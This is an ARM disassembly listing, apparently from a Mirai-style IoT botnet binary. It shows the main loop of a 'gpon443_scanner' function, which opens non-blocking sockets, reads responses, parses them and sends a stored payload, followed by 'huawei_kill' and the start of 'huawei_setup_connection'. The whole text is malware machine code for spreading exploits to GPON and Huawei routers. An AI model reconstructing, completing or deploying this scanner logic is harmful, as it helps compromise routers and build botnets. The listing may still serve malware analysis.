    ee7c:	1affffe7 	bne	ee20 <gpon443_scanner+0x3bc>
    ee80:	e59dc00c 	ldr	ip, [sp, #12]
    ee84:	e5dc3009 	ldrb	r3, [ip, #9]
    ee88:	e3530006 	cmp	r3, #6
    ee8c:	1affffe3 	bne	ee20 <gpon443_scanner+0x3bc>
    ee90:	e1d460b0 	ldrh	r6, [r4]
    ee94:	e3a03cbb 	mov	r3, #47872	; 0xbb00
    ee98:	e2833001 	add	r3, r3, #1
    ee9c:	e1560003 	cmp	r6, r3
    eea0:	1affffde 	bne	ee20 <gpon443_scanner+0x3bc>
    eea4:	e1d430b2 	ldrh	r3, [r4, #2]
    eea8:	e59de010 	ldr	lr, [sp, #16]
    eeac:	e153000e 	cmp	r3, lr
    eeb0:	1affffda 	bne	ee20 <gpon443_scanner+0x3bc>
    eeb4:	e5d4300d 	ldrb	r3, [r4, #13]
    eeb8:	e3130002 	tst	r3, #2
    eebc:	0affffd7 	beq	ee20 <gpon443_scanner+0x3bc>
    eec0:	e3130010 	tst	r3, #16
    eec4:	0affffd5 	beq	ee20 <gpon443_scanner+0x3bc>
    eec8:	e3130004 	tst	r3, #4
    eecc:	1affffd3 	bne	ee20 <gpon443_scanner+0x3bc>
    eed0:	e3130001 	tst	r3, #1
    eed4:	1affffd1 	bne	ee20 <gpon443_scanner+0x3bc>
    eed8:	e5941008 	ldr	r1, [r4, #8]
    eedc:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
    eee0:	e1a02c21 	lsr	r2, r1, #24
    eee4:	e2013cff 	and	r3, r1, #65280	; 0xff00
    eee8:	e1822420 	orr	r2, r2, r0, lsr #8
    eeec:	e1822403 	orr	r2, r2, r3, lsl #8
    eef0:	e1822c01 	orr	r2, r2, r1, lsl #24
    eef4:	e2422001 	sub	r2, r2, #1
    eef8:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    eefc:	e1a03c22 	lsr	r3, r2, #24
    ef00:	e1833420 	orr	r3, r3, r0, lsr #8
    ef04:	e2021cff 	and	r1, r2, #65280	; 0xff00
    ef08:	e1833401 	orr	r3, r3, r1, lsl #8
    ef0c:	e59ce00c 	ldr	lr, [ip, #12]
    ef10:	e1833c02 	orr	r3, r3, r2, lsl #24
    ef14:	e153000e 	cmp	r3, lr
    ef18:	1affffc0 	bne	ee20 <gpon443_scanner+0x3bc>
    ef1c:	e35500ff 	cmp	r5, #255	; 0xff
    ef20:	ca00002d 	bgt	efdc <gpon443_scanner+0x578>
    ef24:	e1a03285 	lsl	r3, r5, #5
    ef28:	e0433105 	sub	r3, r3, r5, lsl #2
    ef2c:	e0833005 	add	r3, r3, r5
    ef30:	e1a03203 	lsl	r3, r3, #4
    ef34:	e59f16c8 	ldr	r1, [pc, #1736]	; f604 <gpon443_scanner+0xba0>
    ef38:	e0653003 	rsb	r3, r5, r3
    ef3c:	e1a02103 	lsl	r2, r3, #2
    ef40:	e591c000 	ldr	ip, [r1]
    ef44:	e0632002 	rsb	r2, r3, r2
    ef48:	e1a02182 	lsl	r2, r2, #3
    ef4c:	e082000c 	add	r0, r2, ip
    ef50:	e5903008 	ldr	r3, [r0, #8]
    ef54:	e3530000 	cmp	r3, #0
    ef58:	12853001 	addne	r3, r5, #1
    ef5c:	11a02283 	lslne	r2, r3, #5
    ef60:	10422103 	subne	r2, r2, r3, lsl #2
    ef64:	10822003 	addne	r2, r2, r3
    ef68:	11a02202 	lslne	r2, r2, #4
    ef6c:	10632002 	rsbne	r2, r3, r2
    ef70:	11a01102 	lslne	r1, r2, #2
    ef74:	10621001 	rsbne	r1, r2, r1
    ef78:	11a01181 	lslne	r1, r1, #3
    ef7c:	1081100c 	addne	r1, r1, ip
    ef80:	11a02005 	movne	r2, r5
    ef84:	0a000009 	beq	efb0 <gpon443_scanner+0x54c>
    ef88:	e2822001 	add	r2, r2, #1
    ef8c:	e3520c01 	cmp	r2, #256	; 0x100
    ef90:	0a000011 	beq	efdc <gpon443_scanner+0x578>
    ef94:	e5913008 	ldr	r3, [r1, #8]
    ef98:	e1a00001 	mov	r0, r1
    ef9c:	e3530000 	cmp	r3, #0
    efa0:	e2811dad 	add	r1, r1, #11072	; 0x2b40
    efa4:	e2811028 	add	r1, r1, #40	; 0x28
    efa8:	1afffff6 	bne	ef88 <gpon443_scanner+0x524>
    efac:	e1a05002 	mov	r5, r2
    efb0:	e3500000 	cmp	r0, #0
    efb4:	0a000008 	beq	efdc <gpon443_scanner+0x578>
    efb8:	e580e00c 	str	lr, [r0, #12]
    efbc:	e1c061b0 	strh	r6, [r0, #16]
    efc0:	ebfffe71 	bl	e98c <gpon443_setup_connection>
    efc4:	eaffff95 	b	ee20 <gpon443_scanner+0x3bc>
    efc8:	e59f1638 	ldr	r1, [pc, #1592]	; f608 <gpon443_scanner+0xba4>
    efcc:	e5910000 	ldr	r0, [r1]
    efd0:	eb002b9a 	bl	19e40 <__GI___libc_close>
    efd4:	e1a00005 	mov	r0, r5
    efd8:	eb0027cf 	bl	18f1c <__GI_exit>
    efdc:	e3a03000 	mov	r3, #0
    efe0:	e58d3684 	str	r3, [sp, #1668]	; 0x684
    efe4:	e3a02004 	mov	r2, #4
    efe8:	e2826d1a 	add	r6, r2, #1664	; 0x680
    efec:	e2822004 	add	r2, r2, #4
    eff0:	e3a03000 	mov	r3, #0
    eff4:	e2866004 	add	r6, r6, #4
    eff8:	e3520080 	cmp	r2, #128	; 0x80
    effc:	e786300d 	str	r3, [r6, sp]
    f000:	1afffff8 	bne	efe8 <gpon443_scanner+0x584>
    f004:	e58d3604 	str	r3, [sp, #1540]	; 0x604
    f008:	e2833004 	add	r3, r3, #4
    f00c:	e283cc06 	add	ip, r3, #1536	; 0x600
    f010:	e2833004 	add	r3, r3, #4
    f014:	e3a02000 	mov	r2, #0
    f018:	e28cc004 	add	ip, ip, #4
    f01c:	e3530080 	cmp	r3, #128	; 0x80
    f020:	e78c200d 	str	r2, [ip, sp]
    f024:	1afffff8 	bne	f00c <gpon443_scanner+0x5a8>
    f028:	e1a0b002 	mov	fp, r2
    f02c:	e1a08002 	mov	r8, r2
    f030:	e58d2724 	str	r2, [sp, #1828]	; 0x724
    f034:	ea000016 	b	f094 <gpon443_scanner+0x630>
    f038:	e3510003 	cmp	r1, #3
    f03c:	13510001 	cmpne	r1, #1
    f040:	0a000001 	beq	f04c <gpon443_scanner+0x5e8>
    f044:	e3510004 	cmp	r1, #4
    f048:	1a0000b4 	bne	f320 <gpon443_scanner+0x8bc>
    f04c:	e796c007 	ldr	ip, [r6, r7]
    f050:	e28d3e72 	add	r3, sp, #1824	; 0x720
    f054:	e1a022ac 	lsr	r2, ip, #5
    f058:	e2833008 	add	r3, r3, #8
    f05c:	e1a02102 	lsl	r2, r2, #2
    f060:	e0822003 	add	r2, r2, r3
    f064:	e5121124 	ldr	r1, [r2, #-292]	; 0xfffffedc
    f068:	e20c001f 	and	r0, ip, #31
    f06c:	e3a03001 	mov	r3, #1
    f070:	e1811013 	orr	r1, r1, r3, lsl r0
    f074:	e15c0008 	cmp	ip, r8
    f078:	e5021124 	str	r1, [r2, #-292]	; 0xfffffedc
    f07c:	c1a0800c 	movgt	r8, ip
    f080:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
    f084:	e2832001 	add	r2, r3, #1
    f088:	e35200ff 	cmp	r2, #255	; 0xff
    f08c:	e58d2724 	str	r2, [sp, #1828]	; 0x724
    f090:	ca000027 	bgt	f134 <gpon443_scanner+0x6d0>
    f094:	e1a03282 	lsl	r3, r2, #5
    f098:	e0433102 	sub	r3, r3, r2, lsl #2
    f09c:	e0833002 	add	r3, r3, r2
    f0a0:	e1a03203 	lsl	r3, r3, #4
    f0a4:	e0623003 	rsb	r3, r2, r3
    f0a8:	e59fe554 	ldr	lr, [pc, #1364]	; f604 <gpon443_scanner+0xba0>
    f0ac:	e1a02103 	lsl	r2, r3, #2
    f0b0:	e0632002 	rsb	r2, r3, r2
    f0b4:	e59e7000 	ldr	r7, [lr]
    f0b8:	e1a06182 	lsl	r6, r2, #3
    f0bc:	e0865007 	add	r5, r6, r7
    f0c0:	e5951008 	ldr	r1, [r5, #8]
    f0c4:	e3510000 	cmp	r1, #0
    f0c8:	0affffec 	beq	f080 <gpon443_scanner+0x61c>
    f0cc:	e59f252c 	ldr	r2, [pc, #1324]	; f600 <gpon443_scanner+0xb9c>
    f0d0:	e5923000 	ldr	r3, [r2]
    f0d4:	e5952004 	ldr	r2, [r5, #4]
    f0d8:	e0623003 	rsb	r3, r2, r3
    f0dc:	e3530005 	cmp	r3, #5
    f0e0:	9affffd4 	bls	f038 <gpon443_scanner+0x5d4>
    f0e4:	e7960007 	ldr	r0, [r6, r7]
    f0e8:	eb002b54 	bl	19e40 <__GI___libc_close>
    f0ec:	e3a04000 	mov	r4, #0
    f0f0:	e3e03000 	mvn	r3, #0
    f0f4:	e7863007 	str	r3, [r6, r7]
    f0f8:	e5950450 	ldr	r0, [r5, #1104]	; 0x450
    f0fc:	e5854008 	str	r4, [r5, #8]
    f100:	eb00248e 	bl	18340 <free>
    f104:	e3a03dad 	mov	r3, #11072	; 0x2b40
    f108:	e2833024 	add	r3, r3, #36	; 0x24
    f10c:	e3a01e43 	mov	r1, #1072	; 0x430
    f110:	e7854003 	str	r4, [r5, r3]
    f114:	e2850018 	add	r0, r5, #24
    f118:	e2811008 	add	r1, r1, #8
    f11c:	eb0016a6 	bl	14bbc <util_zero>
    f120:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
    f124:	e2832001 	add	r2, r3, #1
    f128:	e35200ff 	cmp	r2, #255	; 0xff
    f12c:	e58d2724 	str	r2, [sp, #1828]	; 0x724
    f130:	daffffd7 	ble	f094 <gpon443_scanner+0x630>
    f134:	e3a0c003 	mov	ip, #3
    f138:	e3a04000 	mov	r4, #0
    f13c:	e58dc714 	str	ip, [sp, #1812]	; 0x714
    f140:	e158000b 	cmp	r8, fp
    f144:	a1a00008 	movge	r0, r8
    f148:	b1a0000b 	movlt	r0, fp
    f14c:	e28d1d1a 	add	r1, sp, #1664	; 0x680
    f150:	e28d2c06 	add	r2, sp, #1536	; 0x600
    f154:	e28dce71 	add	ip, sp, #1808	; 0x710
    f158:	e28cc004 	add	ip, ip, #4
    f15c:	e2811004 	add	r1, r1, #4
    f160:	e2822004 	add	r2, r2, #4
    f164:	e1a03004 	mov	r3, r4
    f168:	e2800001 	add	r0, r0, #1
    f16c:	e58dc000 	str	ip, [sp]
    f170:	e58d4718 	str	r4, [sp, #1816]	; 0x718
    f174:	eb001c48 	bl	1629c <__libc_select>
    f178:	e1a00004 	mov	r0, r4
    f17c:	eb001c9a 	bl	163ec <__GI_time>
    f180:	e59fe478 	ldr	lr, [pc, #1144]	; f600 <gpon443_scanner+0xb9c>
    f184:	e58d4724 	str	r4, [sp, #1828]	; 0x724
    f188:	e58e0000 	str	r0, [lr]
    f18c:	ea000004 	b	f1a4 <gpon443_scanner+0x740>
    f190:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
    f194:	e2834001 	add	r4, r3, #1
    f198:	e35400ff 	cmp	r4, #255	; 0xff
    f19c:	e58d4724 	str	r4, [sp, #1828]	; 0x724
    f1a0:	cafffebb 	bgt	ec94 <gpon443_scanner+0x230>
    f1a4:	e1a03284 	lsl	r3, r4, #5
    f1a8:	e0433104 	sub	r3, r3, r4, lsl #2
    f1ac:	e0833004 	add	r3, r3, r4
    f1b0:	e1a03203 	lsl	r3, r3, #4
    f1b4:	e0643003 	rsb	r3, r4, r3
    f1b8:	e59f1444 	ldr	r1, [pc, #1092]	; f604 <gpon443_scanner+0xba0>
    f1bc:	e1a02103 	lsl	r2, r3, #2
    f1c0:	e5918000 	ldr	r8, [r1]
    f1c4:	e0632002 	rsb	r2, r3, r2
    f1c8:	e1a06182 	lsl	r6, r2, #3
    f1cc:	e7960008 	ldr	r0, [r6, r8]
    f1d0:	e3700001 	cmn	r0, #1
    f1d4:	e0867008 	add	r7, r6, r8
    f1d8:	0affffec 	beq	f190 <gpon443_scanner+0x72c>
    f1dc:	e1a022a0 	lsr	r2, r0, #5
    f1e0:	e28d3e72 	add	r3, sp, #1824	; 0x720
    f1e4:	e2833008 	add	r3, r3, #8
    f1e8:	e1a01102 	lsl	r1, r2, #2
    f1ec:	e0812003 	add	r2, r1, r3
    f1f0:	e5123124 	ldr	r3, [r2, #-292]	; 0xfffffedc
    f1f4:	e200401f 	and	r4, r0, #31
    f1f8:	e1a03453 	asr	r3, r3, r4
    f1fc:	e3130001 	tst	r3, #1
    f200:	1a0000ae 	bne	f4c0 <gpon443_scanner+0xa5c>
    f204:	e28dee72 	add	lr, sp, #1824	; 0x720
    f208:	e28ee008 	add	lr, lr, #8
    f20c:	e081200e 	add	r2, r1, lr
    f210:	e51230a4 	ldr	r3, [r2, #-164]	; 0xffffff5c
    f214:	e1a03453 	asr	r3, r3, r4
    f218:	e3130001 	tst	r3, #1
    f21c:	0affffdb 	beq	f190 <gpon443_scanner+0x72c>
    f220:	e5973008 	ldr	r3, [r7, #8]
    f224:	e3530000 	cmp	r3, #0
    f228:	0affffd8 	beq	f190 <gpon443_scanner+0x72c>
    f22c:	e5970000 	ldr	r0, [r7]
    f230:	eb002b02 	bl	19e40 <__GI___libc_close>
    f234:	e3a03e43 	mov	r3, #1072	; 0x430
    f238:	e5972014 	ldr	r2, [r7, #20]
    f23c:	e2833008 	add	r3, r3, #8
    f240:	e1520003 	cmp	r2, r3
    f244:	12878018 	addne	r8, r7, #24
    f248:	0a000064 	beq	f3e0 <gpon443_scanner+0x97c>
    f24c:	e3a05000 	mov	r5, #0
    f250:	e58a5000 	str	r5, [sl]
    f254:	e5973014 	ldr	r3, [r7, #20]
    f258:	e2632e43 	rsb	r2, r3, #1072	; 0x430
    f25c:	e0884003 	add	r4, r8, r3
    f260:	e2822008 	add	r2, r2, #8
    f264:	e5970000 	ldr	r0, [r7]
    f268:	e1a01004 	mov	r1, r4
    f26c:	e3a03901 	mov	r3, #16384	; 0x4000
    f270:	eb001eb3 	bl	16d44 <__libc_recv>
    f274:	e3500000 	cmp	r0, #0
    f278:	da000036 	ble	f358 <gpon443_scanner+0x8f4>
    f27c:	e1a02005 	mov	r2, r5
    f280:	e7d23004 	ldrb	r3, [r2, r4]
    f284:	e3530000 	cmp	r3, #0
    f288:	02833041 	addeq	r3, r3, #65	; 0x41
    f28c:	07c23004 	strbeq	r3, [r2, r4]
    f290:	e2822001 	add	r2, r2, #1
    f294:	e1520000 	cmp	r2, r0
    f298:	1afffff8 	bne	f280 <gpon443_scanner+0x81c>
    f29c:	e59f135c 	ldr	r1, [pc, #860]	; f600 <gpon443_scanner+0xb9c>
    f2a0:	e5973014 	ldr	r3, [r7, #20]
    f2a4:	e5912000 	ldr	r2, [r1]
    f2a8:	e0833000 	add	r3, r3, r0
    f2ac:	e5873014 	str	r3, [r7, #20]
    f2b0:	e5872004 	str	r2, [r7, #4]
    f2b4:	e1a00008 	mov	r0, r8
    f2b8:	eb00161a 	bl	14b28 <util_strlen>
    f2bc:	e5973008 	ldr	r3, [r7, #8]
    f2c0:	e0870000 	add	r0, r7, r0
    f2c4:	e3530002 	cmp	r3, #2
    f2c8:	e3a03000 	mov	r3, #0
    f2cc:	e5c03018 	strb	r3, [r0, #24]
    f2d0:	0a00004b 	beq	f404 <gpon443_scanner+0x9a0>
    f2d4:	e5972450 	ldr	r2, [r7, #1104]	; 0x450
    f2d8:	e5923000 	ldr	r3, [r2]
    f2dc:	e3530000 	cmp	r3, #0
    f2e0:	0a00002c 	beq	f398 <gpon443_scanner+0x934>
    f2e4:	e5970000 	ldr	r0, [r7]
    f2e8:	eb002ad4 	bl	19e40 <__GI___libc_close>
    f2ec:	e3a03dad 	mov	r3, #11072	; 0x2b40
    f2f0:	e2833024 	add	r3, r3, #36	; 0x24
    f2f4:	e3a02000 	mov	r2, #0
    f2f8:	e7872003 	str	r2, [r7, r3]
    f2fc:	e3e00000 	mvn	r0, #0
    f300:	e3a03003 	mov	r3, #3
    f304:	e3a01e43 	mov	r1, #1072	; 0x430
    f308:	e5870000 	str	r0, [r7]
    f30c:	e5873008 	str	r3, [r7, #8]
    f310:	e1a00008 	mov	r0, r8
    f314:	e2811008 	add	r1, r1, #8
    f318:	eb001627 	bl	14bbc <util_zero>
    f31c:	eaffffbf 	b	f220 <gpon443_scanner+0x7bc>
    f320:	e796c007 	ldr	ip, [r6, r7]
    f324:	e28d6e72 	add	r6, sp, #1824	; 0x720
    f328:	e1a032ac 	lsr	r3, ip, #5
    f32c:	e1a03103 	lsl	r3, r3, #2
    f330:	e2866008 	add	r6, r6, #8
    f334:	e0833006 	add	r3, r3, r6
    f338:	e51320a4 	ldr	r2, [r3, #-164]	; 0xffffff5c
    f33c:	e20c001f 	and	r0, ip, #31
    f340:	e3a01001 	mov	r1, #1
    f344:	e1822011 	orr	r2, r2, r1, lsl r0
    f348:	e15b000c 	cmp	fp, ip
    f34c:	b1a0b00c 	movlt	fp, ip
    f350:	e50320a4 	str	r2, [r3, #-164]	; 0xffffff5c
    f354:	eaffff49 	b	f080 <gpon443_scanner+0x61c>
    f358:	03a03068 	moveq	r3, #104	; 0x68
    f35c:	058a3000 	streq	r3, [sl]
    f360:	0a000004 	beq	f378 <gpon443_scanner+0x914>
    f364:	e3700001 	cmn	r0, #1
    f368:	1affffcb 	bne	f29c <gpon443_scanner+0x838>
    f36c:	e59a3000 	ldr	r3, [sl]
    f370:	e353000b 	cmp	r3, #11
    f374:	0affff85 	beq	f190 <gpon443_scanner+0x72c>
    f378:	e5973008 	ldr	r3, [r7, #8]
    f37c:	e3530003 	cmp	r3, #3
    f380:	1a000071 	bne	f54c <gpon443_scanner+0xae8>
    f384:	e5970000 	ldr	r0, [r7]
    f388:	eb002aac 	bl	19e40 <__GI___libc_close>
    f38c:	e1a00007 	mov	r0, r7
    f390:	ebfffd7d 	bl	e98c <gpon443_setup_connection>
    f394:	eaffffa1 	b	f220 <gpon443_scanner+0x7bc>
    f398:	e5924004 	ldr	r4, [r2, #4]
    f39c:	e3540000 	cmp	r4, #0
    f3a0:	1affffcf 	bne	f2e4 <gpon443_scanner+0x880>
    f3a4:	e5970000 	ldr	r0, [r7]
    f3a8:	eb002aa4 	bl	19e40 <__GI___libc_close>
    f3ac:	e3e03000 	mvn	r3, #0
    f3b0:	e5873000 	str	r3, [r7]
    f3b4:	e5970450 	ldr	r0, [r7, #1104]	; 0x450
    f3b8:	e5874008 	str	r4, [r7, #8]
    f3bc:	eb0023df 	bl	18340 <free>
    f3c0:	e3a03dad 	mov	r3, #11072	; 0x2b40
    f3c4:	e2833024 	add	r3, r3, #36	; 0x24
    f3c8:	e3a01e43 	mov	r1, #1072	; 0x430
    f3cc:	e7874003 	str	r4, [r7, r3]
    f3d0:	e1a00008 	mov	r0, r8
    f3d4:	e2811008 	add	r1, r1, #8
    f3d8:	eb0015f7 	bl	14bbc <util_zero>
    f3dc:	eaffff8f 	b	f220 <gpon443_scanner+0x7bc>
    f3e0:	e2878018 	add	r8, r7, #24
    f3e4:	e1a00008 	mov	r0, r8
    f3e8:	e2871058 	add	r1, r7, #88	; 0x58
    f3ec:	e3a02ffe 	mov	r2, #1016	; 0x3f8
    f3f0:	eb001d32 	bl	168c0 <__GI_memmove>
    f3f4:	e5973014 	ldr	r3, [r7, #20]
    f3f8:	e2433040 	sub	r3, r3, #64	; 0x40
    f3fc:	e5873014 	str	r3, [r7, #20]
    f400:	eaffff91 	b	f24c <gpon443_scanner+0x7e8>
    f404:	e1a00008 	mov	r0, r8
    f408:	e59f120c 	ldr	r1, [pc, #524]	; f61c <gpon443_scanner+0xbb8>
    f40c:	eb001d85 	bl	16a28 <__GI_strtok>
    f410:	e2505000 	subs	r5, r0, #0
    f414:	0affffae 	beq	f2d4 <gpon443_scanner+0x870>
    f418:	e1a00005 	mov	r0, r5
    f41c:	eb001d53 	bl	16970 <__GI_strlen>
    f420:	e285100b 	add	r1, r5, #11
    f424:	e1a02000 	mov	r2, r0
    f428:	e1a00005 	mov	r0, r5
    f42c:	eb001d23 	bl	168c0 <__GI_memmove>
    f430:	e1a00005 	mov	r0, r5
    f434:	eb001d4d 	bl	16970 <__GI_strlen>
    f438:	e3a04000 	mov	r4, #0
    f43c:	e1540000 	cmp	r4, r0
    f440:	2a00000a 	bcs	f470 <gpon443_scanner+0xa0c>
    f444:	e7d43005 	ldrb	r3, [r4, r5]
    f448:	e3530022 	cmp	r3, #34	; 0x22
    f44c:	1353003b 	cmpne	r3, #59	; 0x3b
    f450:	0a000016 	beq	f4b0 <gpon443_scanner+0xa4c>
    f454:	e3530020 	cmp	r3, #32
    f458:	0a000014 	beq	f4b0 <gpon443_scanner+0xa4c>
    f45c:	e2844001 	add	r4, r4, #1
    f460:	e1a00005 	mov	r0, r5
    f464:	eb001d41 	bl	16970 <__GI_strlen>
    f468:	e1540000 	cmp	r4, r0
    f46c:	3afffff4 	bcc	f444 <gpon443_scanner+0x9e0>
    f470:	e3a04dad 	mov	r4, #11072	; 0x2b40
    f474:	e2844024 	add	r4, r4, #36	; 0x24
    f478:	e1a00005 	mov	r0, r5
    f47c:	e7976004 	ldr	r6, [r7, r4]
    f480:	e5975450 	ldr	r5, [r7, #1104]	; 0x450
    f484:	eb001d5a 	bl	169f4 <__GI_strdup>
    f488:	e7973004 	ldr	r3, [r7, r4]
    f48c:	e2833001 	add	r3, r3, #1
    f490:	e7850106 	str	r0, [r5, r6, lsl #2]
    f494:	e7873004 	str	r3, [r7, r4]
    f498:	e3a00000 	mov	r0, #0
    f49c:	e59f1178 	ldr	r1, [pc, #376]	; f61c <gpon443_scanner+0xbb8>
    f4a0:	eb001d60 	bl	16a28 <__GI_strtok>
    f4a4:	e2505000 	subs	r5, r0, #0
    f4a8:	1affffda 	bne	f418 <gpon443_scanner+0x9b4>
    f4ac:	eaffff88 	b	f2d4 <gpon443_scanner+0x870>
    f4b0:	e3a03000 	mov	r3, #0
    f4b4:	e7c43005 	strb	r3, [r4, r5]
    f4b8:	e2844001 	add	r4, r4, #1
    f4bc:	eaffffe7 	b	f460 <gpon443_scanner+0x9fc>
    f4c0:	e3a0c004 	mov	ip, #4
    f4c4:	e1a0200c 	mov	r2, ip
    f4c8:	e58dc71c 	str	ip, [sp, #1820]	; 0x71c
    f4cc:	e28dce71 	add	ip, sp, #1808	; 0x710
    f4d0:	e28d3e72 	add	r3, sp, #1824	; 0x720
    f4d4:	e28cc00c 	add	ip, ip, #12
    f4d8:	e3a0b000 	mov	fp, #0
    f4dc:	e3a01001 	mov	r1, #1
    f4e0:	e58db720 	str	fp, [sp, #1824]	; 0x720
    f4e4:	e58dc000 	str	ip, [sp]
    f4e8:	eb001de2 	bl	16c78 <getsockopt>
    f4ec:	e59d3720 	ldr	r3, [sp, #1824]	; 0x720
    f4f0:	e1900003 	orrs	r0, r0, r3
    f4f4:	1a00000e 	bne	f534 <gpon443_scanner+0xad0>
    f4f8:	e5973008 	ldr	r3, [r7, #8]
    f4fc:	e3530003 	cmp	r3, #3
    f500:	0a000021 	beq	f58c <gpon443_scanner+0xb28>
    f504:	e3530004 	cmp	r3, #4
    f508:	0a00000d 	beq	f544 <gpon443_scanner+0xae0>
    f50c:	e3a00c01 	mov	r0, #256	; 0x100
    f510:	eb001f63 	bl	172a4 <malloc>
    f514:	e7963008 	ldr	r3, [r6, r8]
    f518:	e1a022a3 	lsr	r2, r3, #5
    f51c:	e203401f 	and	r4, r3, #31
    f520:	e1a01102 	lsl	r1, r2, #2
    f524:	e3a03003 	mov	r3, #3
    f528:	e5870450 	str	r0, [r7, #1104]	; 0x450
    f52c:	e5873008 	str	r3, [r7, #8]
    f530:	eaffff33 	b	f204 <gpon443_scanner+0x7a0>
    f534:	e7960008 	ldr	r0, [r6, r8]
    f538:	eb002a40 	bl	19e40 <__GI___libc_close>
    f53c:	e3e03000 	mvn	r3, #0
    f540:	e7863008 	str	r3, [r6, r8]
    f544:	e587b008 	str	fp, [r7, #8]
    f548:	eaffff10 	b	f190 <gpon443_scanner+0x72c>
    f54c:	e5970000 	ldr	r0, [r7]
    f550:	eb002a3a 	bl	19e40 <__GI___libc_close>
    f554:	e3a04000 	mov	r4, #0
    f558:	e3e03000 	mvn	r3, #0
    f55c:	e5873000 	str	r3, [r7]
    f560:	e5970450 	ldr	r0, [r7, #1104]	; 0x450
    f564:	e5874008 	str	r4, [r7, #8]
    f568:	eb002374 	bl	18340 <free>
    f56c:	e3a03dad 	mov	r3, #11072	; 0x2b40
    f570:	e2833024 	add	r3, r3, #36	; 0x24
    f574:	e3a01e43 	mov	r1, #1072	; 0x430
    f578:	e7874003 	str	r4, [r7, r3]
    f57c:	e1a00008 	mov	r0, r8
    f580:	e2811008 	add	r1, r1, #8
    f584:	eb00158c 	bl	14bbc <util_zero>
    f588:	eaffff00 	b	f190 <gpon443_scanner+0x72c>
    f58c:	e2874e45 	add	r4, r7, #1104	; 0x450
    f590:	e2844004 	add	r4, r4, #4
    f594:	e59f1084 	ldr	r1, [pc, #132]	; f620 <gpon443_scanner+0xbbc>
    f598:	e1a00004 	mov	r0, r4
    f59c:	eb00156b 	bl	14b50 <util_strcpy>
    f5a0:	e1a00004 	mov	r0, r4
    f5a4:	e7965008 	ldr	r5, [r6, r8]
    f5a8:	eb00155e 	bl	14b28 <util_strlen>
    f5ac:	e3a03901 	mov	r3, #16384	; 0x4000
    f5b0:	e1a02000 	mov	r2, r0
    f5b4:	e1a01004 	mov	r1, r4
    f5b8:	e1a00005 	mov	r0, r5
    f5bc:	eb001e41 	bl	16ec8 <__libc_send>
    f5c0:	e3a01d4e 	mov	r1, #4992	; 0x1380
    f5c4:	e1a00004 	mov	r0, r4
    f5c8:	e2811008 	add	r1, r1, #8
    f5cc:	eb00157a 	bl	14bbc <util_zero>
    f5d0:	e3a01e43 	mov	r1, #1072	; 0x430
    f5d4:	e2811008 	add	r1, r1, #8
    f5d8:	e2870018 	add	r0, r7, #24
    f5dc:	eb001576 	bl	14bbc <util_zero>
    f5e0:	e587b008 	str	fp, [r7, #8]
    f5e4:	e7960008 	ldr	r0, [r6, r8]
    f5e8:	eb002a14 	bl	19e40 <__GI___libc_close>
    f5ec:	e3e03000 	mvn	r3, #0
    f5f0:	e7863008 	str	r3, [r6, r8]
    f5f4:	eafffee5 	b	f190 <gpon443_scanner+0x72c>
    f5f8:	00028c90 	.word	0x00028c90
    f5fc:	0002b8ac 	.word	0x0002b8ac
    f600:	00028cc0 	.word	0x00028cc0
    f604:	0002b8b0 	.word	0x0002b8b0
    f608:	00028c94 	.word	0x00028c94
    f60c:	00028c98 	.word	0x00028c98
    f610:	00028cac 	.word	0x00028cac
    f614:	ba2e8ba3 	.word	0xba2e8ba3
    f618:	00028a3c 	.word	0x00028a3c
    f61c:	0001ef94 	.word	0x0001ef94
    f620:	0001f28c 	.word	0x0001f28c

0000f624 <huawei_kill>:
    f624:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
    f628:	e59f3018 	ldr	r3, [pc, #24]	; f648 <huawei_kill+0x24>
    f62c:	e24dd004 	sub	sp, sp, #4
    f630:	e5930000 	ldr	r0, [r3]
    f634:	e3a01009 	mov	r1, #9
    f638:	eb001ad7 	bl	1619c <__GI_kill>
    f63c:	e28dd004 	add	sp, sp, #4
    f640:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
    f644:	e12fff1e 	bx	lr
    f648:	00028cc4 	.word	0x00028cc4

0000f64c <huawei_setup_connection>:
    f64c:	e92d4070 	push	{r4, r5, r6, lr}
    f650:	e1a05000 	mov	r5, r0
    f654:	e5900000 	ldr	r0, [r0]
    f658:	e24dd010 	sub	sp, sp, #16
    f65c:	e3a06000 	mov	r6, #0
    f660:	e3700001 	cmn	r0, #1
    f664:	e58d6000 	str	r6, [sp]
    f668:	e58d6004 	str	r6, [sp, #4]
    f66c:	e58d6008 	str	r6, [sp, #8]
    f670:	e58d600c 	str	r6, [sp, #12]
    f674:	1b0029f1 	blne	19e40 <__GI___libc_close>
    f678:	e3a00002 	mov	r0, #2
    f67c:	e3a01001 	mov	r1, #1
    f680:	e1a02006 	mov	r2, r6
    f684:	eb001e72 	bl	17054 <__GI_socket>
    f688:	e3700001 	cmn	r0, #1
    f68c:	e5850000 	str	r0, [r5]
    f690:	0a00001e 	beq	f710 <huawei_setup_connection+0xc4>
    f694:	e2850018 	add	r0, r5, #24
    f698:	e3a01c01 	mov	r1, #256	; 0x100
    f69c:	e5856014 	str	r6, [r5, #20]
    f6a0:	eb001545 	bl	14bbc <util_zero>
    f6a4:	e5954000 	ldr	r4, [r5]
    f6a8:	e1a02006 	mov	r2, r6
    f6ac:	e3a01003 	mov	r1, #3
    f6b0:	e1a00004 	mov	r0, r4
    f6b4:	eb001a3e 	bl	15fb4 <__GI___libc_fcntl>
    f6b8:	e3a01004 	mov	r1, #4
    f6bc:	e3802b02 	orr	r2, r0, #2048	; 0x800
    f6c0:	e1a00004 	mov	r0, r4
    f6c4:	eb001a3a 	bl	15fb4 <__GI___libc_fcntl>
    f6c8:	e59f304c 	ldr	r3, [pc, #76]	; f71c <huawei_setup_connection+0xd0>
    f6cc:	e5931000 	ldr	r1, [r3]
    f6d0:	e595300c 	ldr	r3, [r5, #12]
    f6d4:	e58d3004 	str	r3, [sp, #4]
    f6d8:	e3a03002 	mov	r3, #2
    f6dc:	e5952008 	ldr	r2, [r5, #8]
    f6e0:	e1cd30b0 	strh	r3, [sp]
    f6e4:	e2422003 	sub	r2, r2, #3
    f6e8:	e1d531b0 	ldrh	r3, [r5, #16]
    f6ec:	e3520001 	cmp	r2, #1
    f6f0:	e1cd30b2 	strh	r3, [sp, #2]
    f6f4:	83a03001 	movhi	r3, #1
